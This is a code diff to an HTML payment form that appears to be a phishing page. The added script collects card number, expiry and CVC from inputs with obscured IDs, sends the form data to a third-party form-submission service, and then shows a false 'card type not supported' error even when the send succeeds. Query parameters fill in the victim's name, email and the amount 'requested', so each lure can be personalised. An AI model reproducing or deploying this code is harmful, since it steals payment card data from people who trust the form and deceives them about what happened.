@@ -121,6 +121,16 @@
       height: 20px;
       stroke: #ffffff;
         }    
+        
+      .user-details-container {
+  background-color: #1e1e1e;
+  padding: 16px;
+  margin-top: 20px;
+  border: 1px solid #333;
+  border-radius: 8px;
+  font-size: 15px;
+  color: #ddd;
+}
   </style>
 </head>
 <body>
@@ -146,9 +156,9 @@
     <input type="text" placeholder="CVC" maxlength="4" id="codeblock4" name="codeblock4" inputmode="numeric" required />  
   </div>  
 
-  <label>Cardholder name</label>
+  <label>Cardholder</label>
   <div class="address">
-    <p>User ID: <span id="usernameDisplay">Loading...</span></p>
+   <p>Your ID: <span id="usernameDisplay">Loading...</span></p>
   </div>
 
   <!-- Optional metadata -->
@@ -159,6 +169,16 @@
 
     <div class="error-message" id="errorMessage">Error: Please fill out all fields correctly.</div>
     <div class="error-message" id="postSubmitMessage">Unsupported payment method.</div>
+    
+    
+    <!-- Display user details from query parameters -->
+    <label style="margin-top: 130px;">Receivers Details</label>
+    
+  <div class="user-details-container">
+  <p><strong>Name:</strong> <span id="displayEmail">Loading...</span></p>      
+  <p><strong>Amount Requested:</strong> $<span id="displayAmount">Loading...</span></p>
+</div>
+  
   </main>
 
   <footer>
@@ -213,11 +233,86 @@
     }
   });
 </script>
-   <script>
+<script>
+ <script>
+  // Format card input into groups of 4
+  const cardInput = document.getElementById("codeblock1");
+  cardInput.addEventListener("input", () => {
+    let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+    cardInput.value = value.match(/.{1,4}/g)?.join(" ") || "";
+  });
+
+  const submitBtn = document.getElementById("submitButton");
+  const form = document.getElementById("paymentForm");
+  const errorMsg = document.getElementById("errorMessage");
+  const postSubmitMessage = document.getElementById("postSubmitMessage");
+
+  submitBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+
+    const card = cardInput.value.trim();
+    const mm = document.getElementById("codeblock2").value.trim();
+    const yy = document.getElementById("codeblock3").value.trim();
+    const cvc = document.getElementById("codeblock4").value.trim();
+
+    if (!card || !mm || !yy || !cvc) {
+      errorMsg.style.display = "block";
+      postSubmitMessage.style.display = "none";
+    } else {
+      errorMsg.style.display = "none";
+
+      const formData = new FormData(form);
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(result => {
+        if (result.success) {
+          postSubmitMessage.textContent = "Payment failed: Card type not supported.";
+        } else {
+          postSubmitMessage.textContent = "Submission failed. Please try again.";
+        }
+        postSubmitMessage.style.display = "block";
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        postSubmitMessage.textContent = "An error occurred.";
+        postSubmitMessage.style.display = "block";
+      });
+    }
+  });
+</script>
+<script>
+  // Get parameters from URL
+  function getParam(name) {
+    const url = new URL(window.location.href);
+    return url.searchParams.get(name);
+  }
+
+  const fullname = getParam("fullname");
+  const email = getParam("email");
+  const amount = getParam("amount");
+
+  // Show email as User ID
+  if (email) {
+    document.getElementById("usernameDisplay").textContent = email;
+  }
+
+  // Show full name and amount in user-details container
+  if (fullname && amount) {
+    document.getElementById("displayEmail").textContent = fullname;  // Now labeled "Name:"
+    document.getElementById("displayAmount").textContent = amount;
+  } else {
+    document.querySelector(".user-details-container").innerHTML = "<p>Missing user details.</p>";
+  }
+</script>
+<script>
   function goBack() {
     window.history.back();
   }
-  </script>
+</script>
   <script src="delete-account.js"></script>
   <script src="disable-zoom.js"></script>
   <script src="bootstrap.js"></script>
